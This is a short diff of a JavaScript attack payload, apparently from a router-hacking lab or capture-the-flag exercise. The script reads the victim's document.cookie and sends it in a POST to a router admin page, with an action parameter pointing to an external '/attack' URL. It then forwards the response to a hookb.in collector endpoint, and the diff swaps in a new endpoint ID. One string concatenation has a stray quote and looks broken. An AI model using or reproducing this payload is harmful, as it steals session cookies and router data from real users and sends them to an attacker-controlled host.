@@ -1,5 +1,7 @@
 const http = new XMLHttpRequest();
 //http.open('POST', 'http://router.local/login.php', true);
+//http://router.local/home.php?action=view&
+//http://router/local/view.php
 const cook = document.cookie;
 http.open('POST', 'http://router.local/home.php?action=http://nastassiagoodson.github.io/attack&'+cook', true);
 
@@ -7,7 +9,7 @@ http.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
 
 http.onload = function () {
                 const xhr = new XMLHttpRequest();
-                xhr.open('POST', 'https://hookb.in/r10YO9aXxXsqk2XXB3jK', true);
+                xhr.open('POST', 'https://hookb.in/JKaMx2lxx0Cg0l99GB3P', true);
                 xhr.setRequestHeader('Content-type', 'application/json');
                 xhr.send(JSON.stringify(http.responseText));
 
